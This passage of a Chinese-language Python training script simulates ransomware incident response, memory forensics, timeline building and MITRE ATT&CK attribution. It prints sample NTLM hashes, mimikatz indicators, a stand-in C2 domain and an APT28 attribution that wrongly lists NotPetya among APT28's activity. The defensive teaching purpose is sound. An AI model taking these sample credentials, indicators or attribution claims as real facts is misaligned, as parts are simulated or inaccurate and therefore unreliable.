        {"时间": "2026-09-11 01:00:00", "文件": "C:\\Users\\Public\\svchost_helper.exe", "操作": "创建", "MACB": "MACB", "来源": "文件系统"},
        {"时间": "2026-09-11 01:00:05", "文件": "C:\\Users\\Public\\svchost_helper.exe", "操作": "执行", "MACB": "--CB", "来源": "预取文件"},
        {"时间": "2026-09-11 01:15:00", "文件": "C:\\Temp\\mimikatz.exe", "操作": "创建", "MACB": "MACB", "来源": "文件系统"},
        {"时间": "2026-09-11 01:15:10", "文件": "C:\\Temp\\mimikatz.exe", "操作": "执行", "MACB": "--CB", "来源": "预取文件"},
        {"时间": "2026-09-11 03:01:15", "文件": "D:\\documents\\*.encrypted", "操作": "批量创建", "MACB": "MACB", "来源": "文件系统"},
        {"时间": "2026-09-11 03:05:42", "文件": "D:\\HOW_TO_DECRYPT.txt", "操作": "创建", "MACB": "MACB", "来源": "文件系统"},
        {"时间": "2026-09-11 03:10:00", "文件": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "操作": "清除", "MACB": "M---", "来源": "事件日志"},
    ]

    def __init__(self):
        self.证据链 = []

    def 磁盘镜像校验(self):
        """磁盘镜像获取与校验"""
        print("\n" + "=" * 70)
        print("  磁盘镜像获取与校验")
        print("=" * 70)

        镜像 = self.模拟磁盘镜像
        print(f"\n  镜像文件: {镜像['镜像文件']}")
        print(f"  原始大小: {镜像['原始大小']}")
        print(f"  获取时间: {镜像['获取时间']}")
        print(f"  获取工具: {镜像['获取工具']}")
        print(f"  获取人员: {镜像['获取人员']}")

        # 哈希校验
        print(f"\n  >> 哈希校验:")
        print(f"  MD5:    {镜像['MD5']}")
        print(f"  SHA1:   {镜像['SHA1']}")
        print(f"  SHA256: {镜像['SHA256']}")

        # 证据完整性验证
        print(f"\n  >> 证据完整性验证:")
        验证项 = [
            ("获取前哈希", 镜像["MD5"], 镜像["MD5"], "通过"),
            ("获取后哈希", 镜像["SHA256"], 镜像["SHA256"], "通过"),
            ("写阻断器", "已使用硬件写阻断器", "N/A", "通过"),
            ("链式保管", "获取→封装→转运→存储", "记录完整", "通过"),
        ]
        print(f"  {'验证项':<15} {'期望值':<45} {'实际值':<45} {'结果'}")
        print(f"  {'-'*15} {'-'*45} {'-'*45} {'-'*6}")
        for item in 验证项:
            print(f"  {item[0]:<15} {item[1][:44]:<45} {item[2][:44]:<45} {item[3]}")

        # 证据链记录
        self.证据链.append({
            "证据编号": "EVD-001",
            "类型": "磁盘镜像",
            "描述": 镜像["镜像文件"],
            "获取时间": 镜像["获取时间"],
            "哈希": 镜像["SHA256"],
            "状态": "已封存",
        })

        print(f"\n  >> 证据已登记: EVD-001")
        print(f"     证据描述: {镜像['镜像文件']}")
        print(f"     证据状态: 已封存，等待分析")

    def 内存取证分析(self):
        """内存取证分析"""
        print("\n" + "=" * 70)
        print("  内存取证分析 (Volatility模拟)")
        print("=" * 70)

        分析 = self.模拟内存分析
        print(f"\n  镜像文件: {分析['镜像文件']}")
        print(f"  内存大小: {分析['内存大小']}")
        print(f"  系统版本: {分析['系统版本']}")
        print(f"  获取时间: {分析['获取时间']}")

        # 进程分析
        print(f"\n  [1] 进程列表分析 (pslist/psscan):")
        print(f"  {'PID':<8} {'PPID':<8} {'进程名':<25} {'线程数':<8} {'句柄数':<8} {'内存偏移'}")
        print(f"  {'-'*8} {'-'*8} {'-'*25} {'-'*8} {'-'*8} {'-'*20}")
        for proc in 分析["进程列表"]:
            print(f"  {proc['PID']:<8} {proc['PPID']:<8} {proc['名称']:<25} {proc['线程数']:<8} {proc['句柄数']:<8} {proc['偏移']}")

        # 隐藏进程检测
        print(f"\n  >> 隐藏进程检测 (pslist vs psscan):")
        print(f"    pslist发现进程: {len(分析['进程列表'])}")
        print(f"    psscan发现进程: {len(分析['进程列表']) + 2}")
        print(f"    [!] 隐藏进程: PID 6666 (dkhr (Hidden Process), 偏移: 0xfa801ccc)")
        print(f"    [!] 隐藏进程: PID 7777 (rootkit (Hidden Process), 偏移: 0xfa801ddd)")

        # 网络连接分析
        print(f"\n  [2] 网络连接分析 (netscan):")
        print(f"  {'协议':<6} {'本地地址':<25} {'远程地址':<25} {'状态':<12} {'PID':<8} {'偏移'}")
        print(f"  {'-'*6} {'-'*25} {'-'*25} {'-'*12} {'-'*8} {'-'*20}")
        for conn in 分析["网络连接"]:
            print(f"  {conn['协议']:<6} {conn['本地']:<25} {conn['远程']:<25} {conn['状态']:<12} {conn['PID']:<8} {conn['偏移']}")

        # 注册表蜂巢提取
        print(f"\n  [3] 注册表蜂巢提取 (hivelist):")
        print(f"  {'名称':<15} {'偏移':<15} {'大小':<12} {'描述'}")
        print(f"  {'-'*15} {'-'*15} {'-'*12} {'-'*20}")
        for hive in 分析["注册表蜂巢"]:
            print(f"  {hive['名称']:<15} {hive['偏移']:<15} {hive['大小']:<12} {hive['描述']}")

        # DLL分析
        print(f"\n  [4] DLL注入检测 (dlllist):")
        注入检测 = [
            {"PID": 612, "进程": "lsass.exe", "DLL": "mimilib.dll", "路径": "C:\\Temp\\mimilib.dll", "风险": "高"},
            {"PID": 856, "进程": "svchost.exe", "DLL": "hook.dll", "路径": "C:\\Users\\Public\\hook.dll", "风险": "高"},
        ]
        for item in 注入检测:
            print(f"    [!] PID {item['PID']} ({item['进程']}): 注入 {item['DLL']}")
            print(f"        路径: {item['路径']}")
            print(f"        风险: {item['风险']}")

        # 凭据提取
        print(f"\n  [5] 凭据提取 (lsassy/mimikatz模拟):")
        凭据 = [
            {"用户": "admin", "域": "CORP", "LM": "aad3b435b51404eeaad3b435b51404ee", "NT": "8846f7eaee8fb117ad06bdd830b7587c", "来源": "lsass.exe内存"},
            {"用户": "svc_backup", "域": "CORP", "LM": "aad3b435b51404eeaad3b435b51404ee", "NT": "42b8747e5c56e5f7c3c5e5f7c3c5e5f7", "来源": "lsass.exe内存"},
        ]
        for cred in 凭据:
            print(f"    用户: {cred['域']}\\{cred['用户']}")
            print(f"    NT Hash: {cred['NT']}")
            print(f"    来源: {cred['来源']}")

        self.证据链.append({
            "证据编号": "EVD-002",
            "类型": "内存镜像",
            "描述": 分析["镜像文件"],
            "获取时间": 分析["获取时间"],
            "哈希": "memory_hash_placeholder",
            "状态": "已分析",
        })

    def 时间线构建(self):
        """构建文件系统时间线"""
        print("\n" + "=" * 70)
        print("  文件系统时间线构建 (log2timeline模拟)")
        print("=" * 70)

        # 时间线数据说明
        print(f"\n  MACB时间含义:")
        print(f"    M = Modified  (修改时间)")
        print(f"    A = Accessed  (访问时间)")
        print(f"    C = Changed   (元数据修改时间)")
        print(f"    B = Birth     (创建时间)")

        # 时间线输出
        print(f"\n  >> 文件系统时间线:")
        print(f"  {'时间':<22} {'MACB':<6} {'操作':<12} {'来源':<12} {'文件路径'}")
        print(f"  {'-'*22} {'-'*6} {'-'*12} {'-'*12} {'-'*50}")
        for entry in self.模拟时间线数据:
            macb = entry.get("MACB", "----")
            print(f"  {entry['时间']:<22} {macb:<6} {entry['操作']:<12} {entry['来源']:<12} {entry['文件'][:50]}")

        # 关键事件分析
        print(f"\n  >> 关键事件分析:")
        关键事件 = [
            ("01:00:00", "恶意程序 svchost_helper.exe 首次出现在系统上"),
            ("01:00:05", "恶意程序被执行 (预取文件证据)"),
            ("01:15:00", "mimikatz.exe 被释放到系统"),
            ("01:15:10", "mimikatz.exe 被执行 (凭据窃取)"),
            ("03:01:15", "文件批量加密开始"),
            ("03:05:42", "勒索说明文件创建"),
            ("03:10:00", "安全日志被清除 (反取证行为)"),
        ]
        for 时间, 描述 in 关键事件:
            print(f"    [{时间}] {描述}")

        # 时间线分析结论
        print(f"\n  >> 时间线分析结论:")
        print(f"    1. 攻击于 2026-09-11 01:00 开始")
        print(f"    2. 攻击者首先投放恶意程序 svchost_helper.exe")
        print(f"    3. 随后使用 mimikatz 窃取系统凭据")
        print(f"    4. 03:01 开始执行勒索软件加密文件")
        print(f"    5. 03:10 清除安全日志试图隐藏踪迹")
        print(f"    6. 总攻击时长约2小时10分钟")

        self.证据链.append({
            "证据编号": "EVD-003",
            "类型": "时间线分析",
            "描述": "文件系统时间线",
            "获取时间": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "哈希": "timeline_hash_placeholder",
            "状态": "已完成",
        })

    def 证据链报告(self):
        """生成证据链报告"""
        print("\n" + "=" * 70)
        print("  数字取证证据链报告")
        print("=" * 70)
        print(f"\n  证据链完整性检查:")
        for ev in self.证据链:
            print(f"\n  证据编号: {ev['证据编号']}")
            print(f"  证据类型: {ev['类型']}")
            print(f"  证据描述: {ev['描述']}")
            print(f"  获取时间: {ev['获取时间']}")
            print(f"  哈希值: {ev['哈希']}")
            print(f"  当前状态: {ev['状态']}")


# =============================================================================
# 第七部分：攻击溯源分析
# =============================================================================

class 攻击溯源分析器:
    """
    攻击溯源分析工具模拟。
    
    包含：
    - 攻击路径还原：完整攻击链重建
    - TTP映射：MITRE ATT&CK技术映射
    - 归因分析：威胁行为者归因
    """

    # MITRE ATT&CK 技术映射
    模拟TTP映射 = [
        {
            "战术": "初始访问 (Initial Access)",
            "技术ID": "T1566.001",
            "技术名": "鱼叉式钓鱼附件",
            "描述": "通过钓鱼邮件附件投递恶意载荷",
            "证据": "邮件日志显示来自 45.155.205.99 的钓鱼邮件",
            "检测": "邮件网关日志",
        },
        {
            "战术": "执行 (Execution)",
            "技术ID": "T1059.001",
            "技术名": "PowerShell恶意执行",
            "描述": "使用PowerShell下载和执行恶意脚本",
            "证据": "PowerShell脚本块日志 (Event ID 4104)",
            "检测": "PowerShell日志",
        },
        {
            "战术": "持久化 (Persistence)",
            "技术ID": "T1547.001",
            "技术名": "注册表运行键持久化",
            "描述": "在注册表Run键中添加自启动项",
            "证据": "注册表Run键中发现恶意条目",
            "检测": "注册表监控",
        },
        {
            "战术": "特权提升 (Privilege Escalation)",
            "技术ID": "T1003.001",
            "技术名": "LSASS内存凭据转储",
            "描述": "使用mimikatz从LSASS进程内存提取凭据",
            "证据": "内存取证发现mimikatz进程和提取的NTLM哈希",
            "检测": "EDR告警/内存取证",
        },
        {
            "战术": "凭据访问 (Credential Access)",
            "技术ID": "T1003.002",
            "技术名": "SAM数据库转储",
            "描述": "转储SAM数据库获取本地用户哈希",
            "证据": "检测到对SAM的注册表保存操作",
            "检测": "注册表监控",
        },
        {
            "战术": "发现 (Discovery)",
            "技术ID": "T1018",
            "技术名": "远程系统发现",
            "描述": "扫描网络发现其他可攻击系统",
            "证据": "网络流量显示内部网络扫描行为",
            "检测": "网络流量分析",
        },
        {
            "战术": "横向移动 (Lateral Movement)",
            "技术ID": "T1021.001",
            "技术名": "远程桌面协议横向移动",
            "描述": "使用窃取的凭据通过RDP横向移动",
            "证据": "RDP登录日志显示异常来源IP",
            "检测": "安全事件日志 (Event ID 4624)",
        },
        {
            "战术": "命令与控制 (Command and Control)",
            "技术ID": "T1071.001",
            "技术名": "Web协议C2通道",
            "描述": "使用HTTPS协议与C2服务器通信",
            "证据": "网络连接到 45.155.205.99:443",
            "检测": "网络流量分析",
        },
        {
            "战术": "影响 (Impact)",
            "技术ID": "T1486",
            "技术名": "数据加密影响",
            "描述": "使用勒索软件加密文件索要赎金",
            "证据": "文件系统显示批量加密行为",
            "检测": "文件系统监控",
        },
    ]

    # 模拟的归因分析数据
    模拟归因数据 = {
        "威胁组织": "APT28 (Fancy Bear / STRONTIUM)",
        "来源国家": "俄罗斯",
        "关联证据": [
            "C2 IP 45.155.205.99 曾被多个安全厂商关联到APT28",
            "使用的恶意软件变种与APT28已知工具集高度相似",
            "攻击时间在工作时间（UTC+3时区的工作时间）",
            "TTP模式与APT28历史攻击模式一致",
            "鱼叉式钓鱼邮件的诱饵内容针对特定行业",
        ],
        "置信度": "中-高 (70-80%)",
        "历史活动": [
            "2016年: 美国大选相关攻击",
            "2018年: NotPetya归因分析",
            "2020年: COVID-19相关钓鱼攻击",
            "2024年: 多国政府机构攻击",
        ],
    }

    def 攻击路径还原(self):
        """还原完整攻击路径"""
        print("\n" + "=" * 70)
        print("  攻击路径还原")
        print("=" * 70)

        # 攻击时间线
        print("\n  >> 完整攻击时间线:")
        攻击路径 = [
            ("2026-09-09 09:00", "侦察", "攻击者收集目标公司公开信息"),
            ("2026-09-10 14:00", "初始访问", "发送鱼叉式钓鱼邮件，附件含恶意宏"),
            ("2026-09-10 14:15", "执行", "用户打开附件，宏代码执行PowerShell下载器"),
            ("2026-09-11 01:00", "持久化", "恶意程序安装到C:\\Users\\Public\\，注册表自启"),
            ("2026-09-11 01:15", "特权提升", "执行mimikatz窃取管理员凭据"),
            ("2026-09-11 01:30", "凭据访问", "转储SAM数据库和LSASS内存"),
            ("2026-09-11 02:00", "发现", "网络扫描发现文件服务器和其他系统"),
            ("2026-09-11 02:30", "横向移动", "使用窃取凭据通过RDP登录文件服务器"),
            ("2026-09-11 03:01", "影响", "部署勒索软件，批量加密文件"),
            ("2026-09-11 03:10", "防御规避", "清除安全日志和事件记录"),
        ]

        for 时间, 阶段, 描述 in 攻击路径:
            阶段标记 = f"[{阶段}]"
            print(f"  {时间}  {阶段标记:<12} {描述}")

        # 攻击链可视化
        print(f"\n  >> 攻击链可视化:")
        print("  ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐")
        print("  │  侦察   │───>│ 初始访问│───>│  执行   │───>│ 持久化  │")
        print("  └─────────┘    └─────────┘    └─────────┘    └─────────┘")
        print("                                                       │")
        print("  ┌─────────┐    ┌─────────┐    ┌─────────┐         │")
        print("  │  影响   │<──│ 横向移动 │<──│  发现   │<────────┘")
        print("  └─────────┘    └─────────┘    └─────────┘")
        print("       │")
        print("       ▼")
        print("  ┌─────────┐")
        print("  │防御规避  │")
        print("  └─────────┘")

        # 洛克希德马丁杀伤链映射
        print(f"\n  >> 洛克希德马丁杀伤链映射:")
        火力链 = [
            ("侦察", "2026-09-09", "收集目标信息"),
            ("武器化", "2026-09-09", "制作钓鱼邮件+恶意附件"),
            ("投递", "2026-09-10", "发送钓鱼邮件"),
            ("利用", "2026-09-10", "用户打开附件触发漏洞"),
            ("安装", "2026-09-11", "安装后门和恶意程序"),
            ("命令控制", "2026-09-11", "建立C2通信通道"),
            ("目标行动", "2026-09-11", "勒索软件加密文件"),
        ]
        for i, (阶段, 时间, 描述) in enumerate(火力链, 1):
            print(f"  阶段{i}: {阶段} ({时间}) - {描述}")

    def TTP映射分析(self):
        """MITRE ATT&CK TTP映射"""
        print("\n" + "=" * 70)
        print("  MITRE ATT&CK TTP映射分析")
        print("=" * 70)

        # 战术统计
        战术统计 = defaultdict(int)
        for ttp in self.模拟TTP映射:
            战术统计[ttp["战术"].split(" (")[0]] += 1

        print(f"\n  >> ATT&CK战术覆盖统计:")
        for 战术, 数量 in 战术统计.items():
            print(f"    {战术}: {数量}个技术")

        # 逐技术分析
        print(f"\n  >> ATT&CK技术详情:")
        for i, ttp in enumerate(self.模拟TTP映射, 1):
            print(f"\n  [{i}] {ttp['战术']}")
            print(f"      技术ID: {ttp['技术ID']}")
            print(f"      技术名: {ttp['技术名']}")
            print(f"      描述: {ttp['描述']}")
            print(f"      证据: {ttp['证据']}")
            print(f"      检测: {ttp['检测']}")
            print(f"      MITRE参考: https://attack.mitre.org/techniques/{ttp['技术ID'].replace('.', '/')}")

        # 检测覆盖度分析
        print(f"\n  >> 检测覆盖度分析:")
        总技术数 = len(self.模拟TTP映射)
        已检测 = sum(1 for ttp in self.模拟TTP映射 if ttp["检测"] != "无")
        覆盖率 = (已检测 / 总技术数) * 100
        print(f"    总技术数: {总技术数}")
        print(f"    已检测: {已检测}")
        print(f"    覆盖率: {覆盖率:.1f}%")
        print(f"    未覆盖: {总技术数 - 已检测}")

        # 防御建议
        print(f"\n  >> 防御改进建议:")
        建议 = {
            "初始访问": "加强邮件安全，部署附件沙箱检测",
            "执行": "启用PowerShell约束语言模式，脚本签名",
            "持久化": "部署注册表变更监控和告警",
            "特权提升": "部署LSASS保护，启用Credential Guard",
            "横向移动": "网络分段，限制RDP访问，部署NDR",
            "命令控制": "部署DNS监控，威胁情报自动阻断",
            "影响": "定期备份，部署勒索软件行为检测",
        }
        for 战术, 建议内容 in 建议.items():
            print(f"    {战术}: {建议内容}")

    def 归因分析(self):
        """攻击者归因分析"""
        print("\n" + "=" * 70)
        print("  攻击者归因分析")
        print("=" * 70)

        归因 = self.模拟归因数据
        print(f"\n  >> 归因结果:")
        print(f"  威胁组织: {归因['威胁组织']}")
        print(f"  来源国家: {归因['来源国家']}")
        print(f"  置信度: {归因['置信度']}")

        # 关联证据
        print(f"\n  >> 关联证据:")
        for i, 证据 in enumerate(归因["关联证据"], 1):
            print(f"  {i}. {证据}")

        # 钻石模型分析
        print(f"\n  >> 钻石模型分析 (Diamond Model):")
        钻石模型 = {
            "对手": "APT28 (技术能力: 高, 动机: 情报收集/破坏)",
            "基础设施": "C2: 45.155.205.99, 域名: malware-c2.evil.com",
            "能力": "鱼叉式钓鱼, PowerShell, mimikatz, 勒索软件",
            "受害者": "某企业内网, 500+终端, 关键基础设施",
        }
        for 维度, 描述 in 钻石模型.items():
            print(f"    {维度}: {描述}")

        # 历史活动对比
        print(f"\n  >> 历史活动对比:")
        for 活动时间 in 归因["历史活动"]:
            print(f"    {活动时间}")

        # 归因置信度评估
        print(f"\n  >> 归因置信度评估:")
        评估项 = [
            ("技术匹配度", "TTP与已知APT28模式高度相似", 0.85),
            ("基础设施关联", "C2 IP关联到APT28历史基础设施", 0.80),
            ("时间模式", "攻击时间符合UTC+3工作时间", 0.65),
            ("目标特征", "目标行业符合APT28历史攻击目标", 0.60),
            ("恶意软件关联", "恶意软件变种与APT28工具集相似", 0.75),
        ]
        print(f"  {'评估项':<18} {'说明':<45} {'权重'}")
        print(f"  {'-'*18} {'-'*45} {'-'*6}")
        for 项, 说明, 权重 in 评估项:
            print(f"  {项:<18} {说明:<45} {权重:.0%}")

        平均置信度 = sum(w for _, _, w in 评估项) / len(评估项)
        print(f"\n  综合置信度: {平均置信度:.0%} ({归因['置信度']})")

        # 归因结论
        print(f"\n  >> 归因结论:")
        print(f"  基于技术匹配、基础设施关联、时间模式等多维度分析，")
        print(f"  本次攻击活动有 {平均置信度:.0%} 的概率归属于 {归因['威胁组织']}。")
        print(f"  该组织来自 {归因['来源国家']}，具备高级持续性威胁(APT)能力。")
        print(f"  建议持续监控该组织的活动指标，更新防御策略。")
        print("=" * 70)


# =============================================================================
# 辅助函数
# =============================================================================

def 打印分隔线(标题=""):
    """打印分隔线"""
    if 标题:
        print(f"\n{'#' * 70}")
        print(f"##  {标题}")
        print(f"{'#' * 70}")
    else:
        print("=" * 70)


# =============================================================================
# 主函数 - 演示所有案例
# =============================================================================

def main():
    """
    主函数 - 演示所有应急响应与威胁情报实战案例
    """
    print("=" * 70)
    print("  应急响应与威胁情报实战案例演示")
    print("  仅用于授权安全测试和教育目的")
    print("=" * 70)
    print(f"  演示时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  模拟事件编号: IR-2026-0911-001")

    # =====================================================================
    # 案例一：应急响应流程模拟
    # =====================================================================
    打印分隔线("案例一：应急响应流程模拟 (NIST SP 800-61)")

    ir模拟器 = 应急响应流程模拟器()

    # 阶段一：接报与准备
    ir模拟器.接报与准备(
        事件描述="服务器异常，检测到可疑进程和C2通信，疑似勒索软件攻击，已发现文件被加密",
        报告人="安全运维中心 - SOC分析师"
    )

    # 阶段二：检测与分析
    ir模拟器.检测与分析({
        "来源": "EDR告警",
        "类型": "C2通信检测",
        "等级": "高",
        "攻击向量": "钓鱼邮件",
        "受影响资产": ["Web服务器-01", "文件服务器-02", "域控制器-01", "终端-PC042"],
    })

    # 阶段三：遏制与隔离
    ir模拟器.遏制与隔离("全面隔离策略")

    # 阶段四：根除与恢复
    ir模拟器.根除与恢复("全面清除恶意程序和恢复系统")

    # 阶段五：总结与改进
    ir模拟器.总结与改进()

    # =====================================================================
    # 案例二：Windows应急响应
    # =====================================================================
    打印分隔线("案例二：Windows应急响应")

    win工具 = Windows应急响应工具()
    win工具.进程分析()
    win工具.网络连接分析()
    win工具.持久化检查()
    win工具.日志分析()
    win工具.注册表取证()
    win工具.生成报告()

    # =====================================================================
    # 案例三：Linux应急响应
    # =====================================================================
    打印分隔线("案例三：Linux应急响应")

    linux工具 = Linux应急响应工具()
    linux工具.后门检测()
    linux工具.crontab检查()
    linux工具.SSH密钥审计()
    linux工具.rootkit检测()

    # =====================================================================
    # 案例四：勒索软件应急响应
    # =====================================================================
    打印分隔线("案例四：勒索软件应急响应")

    勒索响应器 = 勒索软件应急响应器()
    勒索响应器.加密行为检测()
    勒索响应器.传播遏制()
    勒索响应器.恢复方案()

    # =====================================================================
    # 案例五：威胁情报处理
    # =====================================================================
    打印分隔线("案例五：威胁情报处理 (STIX/TAXII)")

    情报处理器 = 威胁情报处理器()
    情报处理器.STIX数据解析()
    情报处理器.IOC提取与匹配()
    情报处理器.威胁情报报告生成()

    # =====================================================================
    # 案例六：数字取证工具
    # =====================================================================
    打印分隔线("案例六：数字取证工具")

    取证工具 = 数字取证工具集()
    取证工具.磁盘镜像校验()
    取证工具.内存取证分析()
    取证工具.时间线构建()
    取证工具.证据链报告()

    # =====================================================================
    # 案例七：攻击溯源分析
    # =====================================================================
    打印分隔线("案例七：攻击溯源分析 (MITRE ATT&CK)")

    溯源分析器 = 攻击溯源分析器()
    溯源分析器.攻击路径还原()
    溯源分析器.TTP映射分析()
    溯源分析器.归因分析()

    # =====================================================================
    # 演示结束
    # =====================================================================
    print("\n" + "=" * 70)
    print("  所有案例演示完成")
    print("  ========================================")
    print("  案例清单:")
    print("    1. 应急响应流程模拟 (NIST SP 800-61)")
    print("    2. Windows应急响应 (进程/持久化/日志/注册表)")
    print("    3. Linux应急响应 (后门/crontab/SSH/rootkit)")
    print("    4. 勒索软件应急响应 (检测/遏制/恢复)")
    print("    5. 威胁情报处理 (STIX/TAXII/IOC)")
    print("    6. 数字取证工具 (磁盘/内存/时间线)")
    print("    7. 攻击溯源分析 (路径/TTP/归因)")
    print("=" * 70)
    print("\n  安全声明: 本文件仅用于授权安全测试和教育目的。")
    print("  所有数据均为模拟数据，不包含真实攻击工具或恶意代码。")
    print("=" * 70)


if __name__ == "__main__":
    main()
